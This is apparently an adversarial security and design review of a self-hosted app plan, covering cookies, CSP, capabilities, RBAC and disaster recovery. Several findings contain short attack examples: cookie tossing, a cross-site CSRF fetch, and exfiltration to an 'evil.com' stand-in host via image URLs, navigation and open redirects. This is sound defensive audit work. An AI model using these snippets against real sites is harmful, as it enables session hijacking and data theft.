# Adversarial review of `partifactory` PLAN.md

Reviewer note: I read only PLAN.md. Where a claim depends on external software behavior I
couldn't verify from the plan, it's marked **[INFERENCE]** — treat those as "verify before
building", not as established fact.

**Verdict up front.** The core data model (sha256 blobs + immutable manifests + capabilities)
is genuinely good, and the wildcard-DNS/one-tunnel ingress trick is sound. The plan's two
load-bearing weaknesses are (1) the capability hand-off assumes third-party cookie behavior
that Safari does not have, for a family that will mostly hit this from iPhones, and
(2) the security story repeatedly claims containment ("can never", "can't escalate") that
depends on browser rules, Authentik RBAC granularity, and CSP semantics that don't hold as
stated. Separately, §5c DR is written as if Authentik were stateless — it isn't, and a full
restore as specified orphans every grant and the pinned admin.

---

## 1. Security

### S1 — CRITICAL — §2, §3, §3a ("grant hand-off"): `Partitioned` cookies do not do what the plan says, and Safari kills the framed path entirely

The plan: the part host swaps `?cap=` for a `__Host-cap` cookie
(`Secure; HttpOnly; SameSite=None; Partitioned`, "so it works framed and standalone").

What actually happens:

- **A partitioned cookie is keyed by (host, top-level site).** The cookie set when framed
  under `parts.example.com` lives in partition `parts.example.com`. Opening
  `photofinder-part.example.com` standalone is partition `photofinder-part.example.com` — a
  *different jar*. "Works framed and standalone" is false as a single cookie; every
  (part × top-site) combination needs its own silent `/grant` hand-off. That's survivable
  only if every path back through `/grant` is itself silent (see next point).
- **Safari ignores `Partitioned` and blocks third-party cookies outright.** In an iframe
  (workspace view, family-hub embed), the part host's `Set-Cookie` with `SameSite=None` is dropped.
  Every framed view on iOS/macOS Safari then either re-runs the cap dance per request or
  falls back to `requestStorageAccess()` — which requires a user gesture and a browser
  permission prompt. The "0 clicks, the URL just loads" budget is dead on the devices the
  family actually holds.
- **The silent `/grant` redirect cannot run inside an iframe.** Framed under the family hub:
  part host → 302 → `parts.example.com/grant` inside the iframe → the workspace session
  cookie is now third-party → blocked (Safari always; Chrome unless that session cookie is
  also `Partitioned`, which then isn't the partition where the login happened). Result:
  login redirect loop or a blank iframe.
- The e2e suite (Chromium + virtual authenticator against `*.localhost`) structurally cannot
  catch any of this.

**Fix:** stop making the cookie the mechanism. Pass the capability in the iframe `src`
(both workspace and family hub already mint caps server-side, so no `/grant` hop is needed
framed), have the runtime shim keep the cap in JS memory and call `/_rt/*` with an
`Authorization: X-Cap` header (CSP-safe, cookie-free, Safari-proof). Use the
`__Host-cap` cookie only as a convenience for *standalone* top-level opens. Add a real
iPhone Safari to the test matrix and a `Sec-Fetch-Site` check on `/_rt` (see S9).

### S2 — HIGH — §2: capability tokens travel in URLs

`?cap=` appears in: iframe srcs, the `/grant` redirect chain, server logs (partifactory's
own access log), Cloudflare edge logs, and possibly the browser's session history
(intermediate redirects are recorded by some browsers' back/forward traversal). Capability
leaks from any of those are replayable until `exp`.

**Fix:** make URL caps strictly one-time: the part host redeems `?cap=` for the cookie /
in-memory token and records the cap's `jti` as consumed in memory (single process, cheap).
For the iframe path, deliver the cap via `src` but treat it as bearer-until-first-use.
Set `Referrer-Policy: no-referrer` on part hosts so subresource requests to `blobs-part`
never carry it. Strip the query explicitly on the rename 301 (S-last/C10).

### S3 — HIGH — §3: same-site with the homelab + cookie tossing is underplayed, and the mitigation is a throwaway line

The plan accepts "parts are same-site with the rest of `example.com`" and names cookie
tossing as "the remaining exposure." Concretely what changes the day this ships: there are
suddenly dozens of origins running *agent-authored, unreviewed* JS (`<anything>-part.example.com`)
that are same-site with `ha`, `git`, `hub`, `auth`. Any part's JS can set
`document.cookie = "<name>=<value>; Domain=.example.com; Path=/long/path/"`. Domain-scoped
cookies are sent to every sibling host; for any homelab service whose cookie parser takes
the *first* duplicate of a name (common in Go/Rust hand-rolled parsers; Django happens to
keep the last), a longer-path tossed cookie wins and enables session shadowing/fixation on
services the admin doesn't control the source of. CSP cannot prevent this: `connect-src 'self'`
governs fetches, not `document.cookie`.

Also note `form-action` doesn't stop navigation: a `<a>`/`window.location` GET to
`ha.example.com/…?action=…` with the user's HA cookies attached is CSRF-by-navigation; there
is no shipped CSP directive for top-level navigation.

**Fix:** the honest fix is the top-5 #1 — put parts on their own registrable domain
(`example-parts.com` or similar, ~$10/yr, gets its own universal `*.domain` cert; all the DNS
ingress logic is unchanged). If same-site is kept: use `__Host-` prefixes and unique cookie
names on *every* partifactory cookie, parse duplicates last-wins, sandbox framed parts
(`sandbox="allow-scripts"` — see S10), and audit the other example.com services' cookie
handling, which this plan has no authority over.

### S4 — MEDIUM — §3a invites: the link is the whole credential, and family group chats reshare links

Scenario: The admin pastes a single-use invite into the family Telegram group "so everyone can
see the sleep chart." First cousin to click enrolls; the other eight get "invitation
expired," and the cousin who got there first now holds a passkey in `pf-photofinder`.
Revocation is manual and the admin finds out via a support call from a family member.

Secondary: "Lost passkey + no email → the admin mints a new link" creates a *new* user
(generated username), so the person's comment history, grants, and `user:<id>` ownership
stay with the dead account; the pending list and `everyone-signed-in` count accumulate
zombie users; and the provisioner RBAC list (S7) doesn't include "deactivate user" or
"add WebAuthn device to existing user," so cleanup is a manual Authentik admin task this
plan claims not to need.

**Fix:** multi-use-with-cap invite links (N uses, explicit count), a real re-bind path
("add a passkey to existing user" as an admin action — extend the provisioner's needs), and
auto-expiring stale invitees. Also verify Authentik invitations + `fixed_data` → `user_write`
group join works with a generated username via prompt/expression plumbing — the plan states
it as if the stock stages do it [INFERENCE].

### S5 — HIGH — §3a "least-privilege provisioner": Authentik RBAC almost certainly can't scope this finely, and `create_user` may include `is_superuser`

The claim: a service account that can create users, delete invitations, and add/remove
members *of `pf-*` groups only*, so "even a compromised partifactory can't escalate anyone
into the rest of the homelab."

Two problems:

- Authentik's RBAC permissions are per-model (`add_user`, `view_group`, …), not per-instance
  or per-field **[INFERENCE — verify against current Authentik docs]**. If so, "members of
  `pf-*` groups only" is not expressible: a token that can modify group membership can
  modify *any* group's, including the IdP admin group, unless the "core rejects non-`pf-*`"
  check is the only guard — and that check lives in the compromised process, so it's worth
  nothing in the threat model it's defending against.
- If `add_user` allows setting arbitrary fields **[INFERENCE]**, a compromised partifactory
  creates `type: internal, is_superuser: true`, mints an invitation into its own enrollment
  flow, enrolls a passkey, and owns the IdP. The plan's containment sentence is then simply
  false.

**Fix:** before P1b, empirically test what the least token can do (the §7 checklist item is
good — promote it to a design gate). Design fallback if RBAC is model-scoped: invitations
*only* (no `create_user` — invitations create users via the flow without superuser fields),
and put the Authentik admin surface behind something partifactory can't reach (network path
or a separate admin IdP facade). At minimum, rewrite the claim to what's actually enforced.

### S6 — MEDIUM — §3a admin pinning: no break-glass, and the pin is a DR liability

Admin = one `sub` in a config file, and the only login path is Authentik over the tunnel.
Scenario: blueprint misapplies the login flow, or Authentik is down after a NAS incident —
nobody can admin or even authenticate to partifactory, and fixing it requires console access
plus knowing the pin is in `site.toml`, which lives on the host that may be the thing that
died (see D5). Also see D1: a rebuilt Authentik mints *new* `sub`s, so the pinned admin and
every `user:<stable-id>` grant dangle after the very DR flow §5c brags about.

**Fix:** add a break-glass: a host-console-only command (`partifactory admin-break-glass`)
that prints a one-time, 5-minute admin token, gated on local file access. Include the `sub`
pin and `site.toml` in the off-host backup set.

### S7 — MEDIUM — §4 vs §3a: `part_share` contradicts "agents never administer," and minted caps don't cascade-revoke

§3a: agents can only *request* shares. §4 MCP table: `part_share` — "mint/revoke a share or
preview capability." The Telegram flow (§4, §6 P2) *requires* Hermes to actually mint 24h
preview caps. So Hermes's token must mint real capabilities for parts in its scope — i.e. a
leaked Hermes token (a config file on a VM) is a read/exfiltration primitive for every
private part in `family`, via preview links that work with no login.

Also nothing says caps record provenance: revoking an agent token should revoke caps that
token minted; revoking a share row should invalidate already-redeemed cookies. As written,
revocation semantics are per-row only.

**Fix:** split the tool (`part_share_request` for the approval flow; `part_preview` for
short-TTL, viewer-mode caps bounded by the agent's own grant and capped at, say, 24h/1
redemption family). Stamp `minted_by` into every cap and cascade on token/share revoke.

### S8 — HIGH — §3a/§7 public-by-link + `_rt` writes: `SameSite=None` cookie means cross-site CSRF from any website

Flow: family member opens a share link → part host sets `__Host-cap`
(`SameSite=None`, required for the iframe design). Now every website they later visit can
issue `fetch('https://sleep-chart-part.example.com/_rt/db/…', {method:'PUT', credentials:'include'})`.
CORS blocks *reading* the response, not the *write*; the cookie rides along because
`SameSite=None`. For a `comment`-mode share, that's comment spam; for `interact` parts, it's
silent corruption of the `db` docs from arbitrary web pages. There is no CSRF story in the
plan (no `Origin`/`Sec-Fetch-Site` validation, no custom-header requirement, no token in
body).

**Fix:** `/_rt/*` must reject anything with `Sec-Fetch-Site` not in `{same-origin, same-site, none}`
or without the `X-Cap` header from S1 (custom headers can't be sent cross-site without a
CORS preflight the blob-host's `*` doesn't cover for the *part* host). Add it to §7.

### S9 — MEDIUM — §2/§5a CSP: the allowlist is not a boundary, and the listed directives don't close the holes

- `script-src` including **cdnjs/jsDelivr/unpkg is effectively `*`**: anyone can publish an
  npm package, and jsDelivr serves it. A "restricted" part can load arbitrary attacker-chosen
  JS from an allowed origin. Stop describing this as containment; the boundary is origin
  isolation, full stop. If you want a boundary, vendor the blessed libs as *partifactory
  blobs* (they're edge-cached on your own host anyway — better perf than the CDN and no
  third-party dependency).
- The directive list has gaps: no `default-src` lockdown, no `img-src`/`font-src`/`media-src`
  (exfil via `<img src=//evil?d=…>`), no `base-uri` (base hijack rewrites every relative
  URL), no `object-src 'none'`, no `worker-src`. And §2 says `form-action 'self'` while §3
  says `form-action 'none'` — pick one (`'none'` breaks legit forms).
- CSP cannot stop top-level navigation exfil (`location = 'https://evil.com#' + secret`).
  Framed parts should get `sandbox="allow-scripts allow-same-origin"` — cross-origin here,
  so the combination is safe — which also kills top-nav and popups from framed parts.
- No COOP/COEP/Fetch-Metadata story anywhere.

**Fix:** `default-src 'none'` + explicit opens; `base-uri 'none'`; `frame-ancestors` as
planned; sandbox framed loads; vendored runtime libs; and say honestly in the plan that a
malicious *part* can navigate/phish its viewer — that's what the separate-origin decision
buys, and it's also why top-5 #1 matters.

### S10 — MEDIUM — §3a `/grant?part=…&return=…`: open redirect unless pinned down

If `return` is an absolute URL, `parts.example.com/grant?part=x&return=https://evil.com` is a
phishing gadget on a domain family has been trained to trust. `return=//evil.com`
(protocol-relative) is the classic bypass if you only check `startsWith('/')`.
Also `part` is attacker-chosen: a crafted link makes the workspace mint a cap for any part
the *victim* can see and bounce it somewhere — capability laundering with the IdP's
blessing.

**Fix:** `return` must be validated as a path, or a hostname matching
`^[a-z0-9-]{1,58}-part\.example\.com$` (no userinfo, no port); `part` must resolve to an
existing part; reject anything else with 400, not a redirect.

### S11 — MEDIUM — §5a/§7 blobs host: CORS `*` + immutable + edge-cached = revocable nothing

"Blobs are public-by-hash and unguessable" — but hashes are identity, not secrecy: every
private part's bytes are addressable on a host with CORS `*`, no auth, `max-age=1y
immutable`, cached at the edge. Consequences:

- Any single hash disclosure (a log, a Referer slip, a `runtime_errors` report containing a
  blob URL, an old workspace DOM) = permanent public read: you cannot revoke an edge-cached
  immutable object. §7's "a revoked share → 404 within seconds" is false for every blob the
  revoked viewer ever loaded — including, say, *family photos* on `photofinder`.
- Existence oracle: anyone can probe `blobs-part.example.com/b/<hash>` for known content
  (200 vs 404) — for low-entropy templated parts this confirms "this exact content is
  hosted here."

**Fix:** decide and *write down* the confidentiality model. Option A (cheap, honest): blob
URLs are capabilities; document that hash knowledge = permanent access, and stop claiming
revocation. Option B (stronger): blobs for non-public parts are served from the *part* host
(`/b/<hash>` behind the cap, still immutable+cacheable because the cap is in a cookie/header
Cloudflare won't cache — so no edge cache; accept the perf cost) or via HMAC-signed
per-part URLs on the blob host. A is fine for family media *if* you accept it; the plan
currently claims both A's performance and B's revocation.

### S12 — LOW/MEDIUM — §3a "removal takes effect within a minute" vs §5a "no DB read per request" vs §7 "revoked → 404 within seconds"

Three mutually inconsistent claims: 10-minute caps with silent refresh, stateless HMAC
checks with no DB read, and second-scale revocation. Silent refresh on a standalone part
host requires either a long-lived refresh cookie (revocation lag = its TTL) or a hop to
`parts.example.com` (needs session, third-party when framed).

**Fix:** single-process epoch scheme: a monotonically increasing `grant_epoch` in memory,
bumped on any revoke/share/agent-token change; caps embed the epoch at mint; verification =
HMAC + `epoch >= cap.epoch` — still zero DB reads, revocation effective on next request
(process restart loads epoch from SQLite). Cheap, and it makes §7 true.

## 2. Correctness / feasibility

### C1 — CRITICAL — covered as S1 (partitioned cookies / Safari / `/grant` in iframes). This is the plan's biggest "won't work as described."

### C2 — MEDIUM — §3a/§4 Telegram: the in-app browser will break anything needing WebAuthn, and link unfurling leaks content to Telegram's servers

- Telegram's in-app browser (iOS: embedded WKWebView, own cookie jar; no WebAuthn
  **[INFERENCE for current versions]**): preview caps work (no login — good design), but any
  hop into `parts.example.com` (comment login, workspace link) hits a passkey prompt that
  cannot run. The "comment from your phone" flow must stay entirely inside the preview-cap
  surface.
- Telegram *unfurls* every link posted: Telegram's fetchers request the URL server-side
  before the human taps. If the preview link serves content to cookieless GETs (it must, to
  work with no login), Telegram's infrastructure reads the part (title, og metadata, or the
  full page).

**Fix:** share/preview links posted anywhere should point at `parts.example.com/s/<token>`,
which serves a static, content-free og-card and client-redirects to the cap URL — unfurlers
get a card, browsers get content. Add "preview link redemption requires a JS hop" so
fetchers never see content.

### C3 — MEDIUM — §3a WebAuthn conditional UI (autofill) is asserted as a config toggle

"Passkey autofill: the identification stage gets the WebAuthn stage attached, so browsers
offer the passkey straight away" — conditional mediation requires the *frontend* to call
`navigator.credentials.get({mediation:'conditional'})` on page load and the RP to support
discoverable credentials. Whether Authentik's identification stage does this today is
unverified **[INFERENCE]**. If it doesn't, the "1 tap" budget becomes "tap user choice →
tap passkey," and the whole click-budget table shifts by one interaction per login.
The same applies to `max_age`-based re-auth: Authentik's honoring of `max_age` (vs
`prompt=login`) needs verification; if ignored, the "fresh passkey auth for admin" gate
silently no-ops into "any valid session" — a security hole, not a UX one.

**Fix:** P1 spike: verify conditional UI and `prompt=login` behavior against the deployed
Authentik version; use `prompt=login` (widely supported) for admin re-auth rather than
`max_age`. Put both in §7's checklist.

### C4 — LOW — §5 stack/§8: `h2c from cloudflared` is almost certainly not a thing

cloudflared speaks HTTP/1.1 (or HTTPS/h2 with `http2Origin`) to origins; cleartext h2c to a
local origin is not a supported mode **[INFERENCE — check current cloudflared docs]**.
Impact: none (loopback hop), but the plan states it as a design fact. Also: SSE/long-poll
through Cloudflare needs heartbeats < ~100 s or the proxy times the stream out; `part_watch`
long-poll and the SSE fanout should state a heartbeat interval.

### C5 — LOW — §3 wildcard mechanics: correct, with two footnotes

For the record, this part is right: `*-part` isn't a legal DNS wildcard label, explicit
records beat the wildcard, universal SSL covers one level of `*.example.com`, and
`<name>-part` (≤58+5=63 label chars) fits. Two footnotes: (1) the wildcard permanently
captures every *unspecified* `example.com` label — any future service whose explicit record
isn't created lands on partifactory's 404, which is a confusing failure mode worth a
monitor; (2) you can never go one level deeper (`<space>.<name>-part.example.com`) without
ACM or a new zone — relevant if S3's fix is "second zone" instead of "second domain."

### C6 — MEDIUM — §3a/§5c: mutating the *shared* login flow to save partifactory clicks, and blueprints aren't a reconciler

- The click-reduction script edits the site's existing `user-login`/identification stages
  (`remember_me_offset`, WebAuthn attach). Those stages belong to flows the **family hub and every
  other example.com service** sign in through. Optimizing partifactory's hop changes everyone
  else's login. "Records the before-state so each one can be undone" is imperative patching
  of shared state — exactly what the next paragraph says provision *isn't*.
- Blueprint application is declarative for objects the blueprint *creates* (by identifier),
  but "ensure this existing stage has `remember_me_offset=0`" is not reconciled by
  blueprints; it's a one-shot API patch that drifts. So "running it twice changes nothing"
  (§5c) is unproven for the IdP half.

**Fix:** clone a dedicated authorization/login flow for partifactory's provider
(Authentik providers accept custom authorization flows) and blueprint *that*; leave the
household's shared flows alone. Restrict the shared-flow edits to things the admin explicitly
signs off as global.

### C7 — MEDIUM — §5: oxc + rolldown at the center of the product

oxc's transformer and rolldown are real but young; JSX/TS edge cases (automatic runtime,
decorators, unusual pragmas) and bundling semantics will regress across versions. The plan
correctly returns compile *warnings* in `part_put` results — good. Risks: agent-authored
TSX is the *common* input, so transformer bugs become user-visible "part won't run";
bare-import resolution (`react`, `lodash`) needs an import-map story that the plan never
states (CDN allowlist implies it, but who emits the import map? per-part? global?).
Leptos is the least risky item in the table; rmcp streamable-HTTP stateless is a supported
mode. `*.localhost` e2e: Chrome/Firefox resolve `*.localhost` to loopback and allow Secure
cookies on localhost; Safari's handling of subdomain `.localhost` is unreliable
**[INFERENCE]** — pin CI to Chromium and note why.

**Fix:** pin oxc/rolldown versions, keep a corpus of shartifacts' compat-matrix artifacts as
golden compile tests (you're borrowing the matrix anyway), define the import-map + vendored
runtime-libs story (see S9) in the plan, and keep the "agent builds with vite, uploads
dist/" escape hatch prominent — it will carry real load.

### C8 — LOW — §4/§3a: rename semantics have a collision bug

"Renames redirect: the old hostname 301s to the new one for good." Scenario: `photos` →
`family-photos`; six months later an agent creates a *new* part named `photos`. Now the
permanent 301 and the new part fight over `photos-part.example.com`. Also the 301 must drop
`?cap=` (re-leaking the cap on every old link).

**Fix:** rename history table; a name that has ever been used is reserved (or the 301 dies
when the name is reused — pick one and state it). Strip the query string on the 301.

### C9 — LOW — §5a.3: "per-view HTML entry incl. capability check < 1 ms" hides a DB read

For `version: live` parts, resolving the entry requires the current manifest, which is a DB
lookup unless you keep an in-memory `part → current version` cache invalidated by the
events table. Not stated; fine at this scale, but the target as written assumes it.

## 3. Scope / complexity

### O1 — MEDIUM — §3a: the three-trait provider abstraction is YAGNI with a tax

"Swappable IdP" (traits + Authentik adapters + local-user dev adapter + static-file
directory + "invites disappear from the UI" conditional UX) is a real second product for a
household that already standardized on Authentik. Keep the *neutral subject vocabulary*
(`user:<id>`, `group:<name>`) in the grants table — that's the part that pays off — and
write the Authentik adapter directly. Delete the trait layer until a second provider exists.

### O2 — MEDIUM — §5a.5: the swappable io_uring runtime is theater

A thread-per-core runtime benchmark program for a service with two users and a phone is a
science project. Cut `monoio`/`compio` and the runtime trait; keep tokio. Similarly
`frankensqlite` as a "stretch" backend — delete; a conformance test harness for a database
you don't use is pure cost.

### O3 — LOW — §3a: webhook + 60 s poll is double plumbing for one job

The notification webhook and the directory poll both exist to notice group changes. Keep
the poll (bounded, simple, already needed at startup); cut the webhook until the poll's
latency actually hurts.

### O4 — MEDIUM — §5c: the deploy-adapter matrix and the full declarative reconciler are the most expensive items in the plan

`docker` over SSH contexts, `truenas` middleware, VPS/Mac targets, plan/diff mode, before-
state recording, refuse-to-delete tagging — this is Terraform-with-extra-steps for one box.
v1 needs: a compose file on the NAS, `partifactory restore`, and a *script* for the Cloudflare
+ Authentik setup that is idempotent-by-construction (create-if-missing) and honest about
being a script. The "reconciler" framing also invites the C6 drift problem.

### O5 — LOW — §3a: the `manage`-role grant-editing rule ("among subjects they already have") is subtle policy machinery for two adults

This creates an authorization edge case (partial grant editing) that will produce bugs for
zero users. v1: `manage` = edit content + comments + see audit; all grant changes go through
The admin (or the approval queue). Revisit when someone other than the admin actually manages a
part.

### Missing (will hurt):

- **M1 — blob GC and quotas (HIGH).** Nothing ever deletes blobs; nothing caps agent
  version churn. A runaway agent loop (`part_put` in a watch cycle) fills `/data` on the NAS
  and the R2 bucket, and FTS grows with it. Need refcount-on-manifest GC (orphan sweep),
  per-space/per-token quotas, and a disk watermark.
- **M2 — rate limiting on the internet-facing surface (HIGH).** Public-by-link parts, the
  `/grant` endpoint, invite redemption, and `/mcp` bearer auth have no rate-limit/lockout
  story. Cloudflare WAF/rate-limit rules on the zone are the cheap answer; say so.
- **M3 — monitoring (MEDIUM).** No uptime check, no log drain, no error tracking for the
  server itself. `runtime_errors` covers parts, not partifactory. When the tunnel is down,
  the family sees Cloudflare 1033 and the admin finds out last.
- **M4 — Authentik in DR (see D1).**

## 4. Performance claims

Mostly honest framing — the plan concedes static-blob parity and scopes the "win" to a
reduced request subset. Remaining problems:

### P1 — MEDIUM — µs-scale p99 as a *release-blocking CI gate* on shared runners = flaky gates or fake numbers

p99 blob < 200 µs and entry < 1 ms will not hold deterministically on Gitea CI runners
under neighbor load; you'll either flake releases or quietly widen the gate until it's
meaningless. Run the bench on the NAS (or a pinned self-hosted runner), and make CI
thresholds loose (regression detection vs. absolute µs).

### P2 — MEDIUM — "pread/sendfile … bytes never pass through userspace" is stated as if axum gives it for free

It doesn't: tokio/hyper's default body path copies through userspace; true sendfile on Linux
needs custom plumbing (raw fd + `sendfile(2)` wired into a hyper body). It's doable but it's
real work, and it only pays on the origin→cloudflared loopback hop — the user-visible path
is edge-dominated anyway. Either budget the work or drop the claim; "mmap LRU + pread" is
already plenty at this scale.

### P3 — MEDIUM — "< 150 ms repeat open, mostly edge-cached" — the HTML entry is never edge-cached, so the sentence is doing hidden work

Every open pays edge→tunnel→NAS→tunnel→edge for the entry plus first `_rt` call. 150 ms is
achievable on a good uplink and not on a bad one, and the server-µs targets optimize the
layer that matters least. Better design, which also fixes the claim: make the per-part HTML
entry *content-free and cacheable* (immutable shell referencing blobs; cap carried by
cookie/header, first `_rt` bootstrap does the authorization) — then repeat opens really are
fully edge-served.

### P4 — LOW — brotli-11 *and* zstd-19 double the blob store for a marginal win

Pick one (brotli, for browser coverage; zstd only if you later serve agents/CLI). Saves
CPU at save-time and disk/GC surface. Also note brotli-11 is slow (~1 MB/s/core): a 2 MB
bundle costs seconds of CPU at `part_put`, which is fine offline but should be in the
save-time budget, not hidden.

### P5 — LOW — the `part_put < 10 ms` target excludes the common case

"(no TSX)" excludes the agent-typical path (TSX + bundle + compress = 100 ms–1 s+). Honest
version: state both numbers, or the target measures the boring path and the bench never
regresses the real one. The nginx/HAProxy fixture is a fair comparison *only* if you note
partifactory additionally does Host parsing + cap verification per request — fine, but say
it; and "no upstream hop" cuts the other way too: nginx-in-front-of-nothing isn't a
configuration anyone runs.

## 5. Disaster recovery

### D1 — CRITICAL — §5c: Authentik is out of scope, and it holds all the identity state

`restore` rebuilds `/data` (partifactory.db + blobs); `provision` re-applies blueprints for
the provider/flows/service account. Blueprints are *structure*, not *data*: users, passkeys,
group memberships, and `sub`s are not in any blueprint. After a real loss-of-host:

- every `user:<stable-id>` grant dangles (new Authentik users = new `sub`s),
- The admin pin (S6) dangles — nobody is admin,
- all passkeys are gone; the household re-enrolls via new invites the admin mints one by one,
- agent tokens survive (good), but `everyone-signed-in`/group grants are empty until
  re-populated.

"Target RTO: under 15 minutes" is true for partifactory and false for the system. Either
include Authentik's Postgres in the backup scope (it's on the same NAS; add it to the
off-host set), or write the documented degraded mode (re-invite everyone; grants re-applied
from an exported grants dump). The monthly drill must exercise whichever you choose.

### D2 — MEDIUM — §5c: Litestream DB vs blob sync have no ordering, so restores can be inconsistent

A `part_put` that commits the manifest (DB) before the blob finishes syncing to R2 yields a
point-in-time restore where manifests reference missing blobs. Content-addressing makes the
hole *detectable*, not absent. **Fix:** strict order — blob upload acknowledged *before* the
manifest commit (it's also better for live serving), plus a restore-time verify pass.

### D3 — MEDIUM — §5c: RTO < 15 min vs "restore rebuilds /data"

Blobs are append-only to R2 forever; a restore downloads *all of history* before serving.
After a year of agent churn + family media that's tens of GB over whatever the new host's
downlink is. **Fix:** lazy restore — DB first, blob fetch-on-miss from R2 (with a warm list
for the N newest parts). Then 15 min is real.

### D4 — LOW — §8/§5c: cutover leaves two connectors

If the old host still runs cloudflared with the same tunnel token, traffic load-balances
between dead and alive origins. `provision` should stop/drain the old connector (or rotate
the connector token) as part of reconcile. Also: "DNS records created only once the service
answers health checks" — specify *how* (probe via the tunnel's `cfargotunnel.com` hostname?)
or it's a nice sentence.

### D5 — MEDIUM — §5c: circular dependencies make the DR path untested where it matters

The pipeline that restores partifactory runs on Gitea; Gitea runs on the same NAS you just
lost. Secrets live in Gitea; `site.toml` is "private" (where? backed up how?); the admin pin
is in it (S6). The plan's own line — "one credential set from any Docker host" — is only
true if the *laptop-driven* path is the one drilled. **Fix:** the monthly drill runs from a
laptop with the three credentials and a released binary, not from CI; document the runbook;
back up `site.toml` (and the pin) off-host with the same care as the DB.

### D6 — LOW — §5c: "rotating cap keys doesn't break links" requires keeping old keys forever

Durable share links are HMAC caps; verifying links minted under `kid=1` after rotating to
`kid=2` means retaining `kid=1` indefinitely (or re-signing every share row on rotation).
State the retention policy (keep last N kids; re-sign shares on rotation) or the sentence is
a future outage.

## 6. UX: do the click budgets survive contact with reality?

- **U1 (ties to S1/C1):** "0 clicks, already signed in" — fails framed on Safari/iOS as
  designed; passes only after the S1 fix (cap-in-src + header auth). Standalone on Safari it
  works (first-party cookie) *until the workspace session expires*, then it's the U3 flow.
- **U2:** "1 tap sign-in" — conditional UI, when it works, is *two* interactions (focus the
  autofill field, pick the credential) plus the biometric. Count honestly or the e2e budget
  (which can't see browser chrome) will report fiction: a virtual authenticator measures
  page clicks, not taps. Budget "2 taps incl. biometric."
- **U3:** "plus a passkey tap if the re-auth window has lapsed" — the re-auth is a full OIDC
  redirect through Authentik (page loads, conditional-UI interaction, biometric, redirect
  back, dialog state rebuilt). That's 3–5 interactions and a context switch, not "a tap."
  Either budget it honestly or keep the re-auth window generous (30 min) and show a
  countdown.
- **U4 (S4):** invite links into group chats → single-use races and "expired" confusion for
  exactly the population (family) the budgets are written for.
- **U5:** renames silently strand per-device storage (service workers, IndexedDB, installed
  PWAs break their origin) — the plan warns the *agent*, but the person hurt is the family
  member whose home-screen icon now half-works. Make rename a rare, admin-confirmed action
  with a user-visible note, or v1: no renames (new part + 301 only).
- **U6 (C2):** anything that pushes a Telegram user toward login dead-ends in the in-app
  browser. Keep the Telegram surface strictly preview-cap-only.

The budgets-as-e2e-gates idea is good; just measure what a human taps (declare the browser/
OS-prompt taps per flow in the table) instead of what the DOM receives, or the gate is
aspirational fiction.

## Top 5 changes, ranked

1. **Put parts on their own registrable domain** (e.g. `example-parts.com`, own zone, own
   universal `*.domain` cert, same one-tunnel ingress). Kills S3 cookie tossing against the
   homelab, ends the same-site exposure of HA/git/hub/auth to agent-authored JS, removes
   the reserved-names arms race, and costs ~$10/yr. Every other mitigation for S3 is a
   patch; this is the cure.
2. **Redesign the capability hand-off for the cookieless world (S1/S2/S8):** cap in the
   iframe `src` + `Authorization: X-Cap` header for `/_rt` + `Sec-Fetch-Site` enforcement;
   one-time URL caps; the `__Host-cap` cookie kept only as a standalone-top-level
   convenience; an actual iPhone Safari in the e2e matrix. Without this the headline UX
   claim ("0 clicks") and the family-hub embed are broken on the family's primary devices.
3. **Make revocation and blob confidentiality honest (S11/S12):** in-memory grant-epoch
   invalidation for second-scale revocation with zero DB reads; an explicit decision on
   blobs (public-by-hash forever, documented — or cap-gated); unfurl-safe share links via a
   static card at `parts.example.com/s/<token>` so Telegram's fetchers never see content.
4. **Put identity into DR and demote the provisioner (D1/S5/D5):** back up Authentik's
   database (or write the degraded-mode re-invite runbook and test it), back up `site.toml`
   + the admin pin, add a host-console break-glass admin, make the monthly restore drill
   laptop-driven. Before P1b, empirically verify what the least-privilege service account
   can do; if Authentik RBAC is model-scoped, drop `create_user` and go invitations-only.
5. **Cut ~a third of the machinery and add the missing boring parts (O1–O5, M1–M3, P1–P5):**
   delete the IdP-swap traits, the io_uring runtime swap, frankensqlite, and the webhook
   (poll only); make bench targets informational CI, not release gates; drop zstd; simplify
   `manage` to content-only. Spend the savings on blob GC + quotas, rate limiting on public
   endpoints, monitoring/uptime, and cacheable HTML shells (which is also what makes the
   <150 ms claim true).
